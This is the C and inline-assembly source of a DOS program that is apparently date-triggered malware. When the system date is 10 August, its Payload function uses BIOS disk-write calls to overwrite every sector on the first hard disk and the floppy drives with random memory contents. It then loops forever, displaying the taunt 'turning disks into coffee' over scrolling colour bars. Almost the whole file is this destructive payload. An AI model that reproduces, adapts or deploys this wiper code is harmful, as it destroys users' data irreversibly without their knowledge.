#include <string.h>
#include <stdlib.h>
#include "data.h"
typedef unsigned char byte;
typedef unsigned int uint;
byte bgPal[] = { 0x0A, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32 };
byte disks[] = { 0x80, 0x00, 0x01, 0x02 };
char *coffee = "-Please wait, turning disks into coffee-";
int coffeelen;
void SetGraphicsMode(unsigned char mode) 
{
	__asm
	{
		xor ah, ah
		mov al, mode
		int 10h
	}
}
void SetPixel(byte pixel, int x, int y, byte page)
{
	__asm
	{
		mov ah, 0x0C
		mov al, pixel
		mov cx, x
		mov dx, y
		mov bh, page
		int 10h
	}
}
void WriteSector(byte disk, byte sector, uint addr, byte track, byte head)
{
	__asm
	{
		mov ah, 3h
		mov al, 1
		mov ch, track
		mov dh, head
		mov dl, disk
		mov cl, sector
		mov bx, addr
		int 13h
	}
}
void DrawLine(byte color, int x, int y, int length)
{
	int _x;
	for(_x=0;length>_x;_x++)
		SetPixel(color, x+_x, y, 0);
}
void Payload()
{ 
	int x,_x, y,_y, s, t, d, o, z = 0;
	_y = 0;
	o = 0;
	coffeelen = strlen(coffee);
	SetGraphicsMode(0x13);
	for(d=0;4>d;d++)
	   for(t=0;113>t;t++)
		 for(s=0;18>s;s++)
			 WriteSector(disks[d], s, rand()%0xFFFF, t, 0x00); 
	while(1)
	{
			__asm
			{
				mov ah, 13h
				mov bp, coffee
				xor bx, bx
				mov bl, 0x0A
				mov al, 1
				mov cx, coffeelen
				mov dh, 23
				mov dl, 0
				int 10h
			}
			if(o>=240)o=0;
			for(_x=0;6>_x;_x++){_y++;DrawLine(bgPal[_x], 0, _y-o, 320);}
			for(_x=6;0>_x;_x--){_y++;DrawLine(bgPal[_x], 0, _y-o, 320);}
			if(_y>=240)o++;
	}
}
int main()
{
	unsigned char month, day;
	__asm
	{
		mov ah, 2Ah
		int 21h
		mov month, dh
		mov day, dl
	}
	if(month==8&&day==10)
		Payload();
	return 0;
}
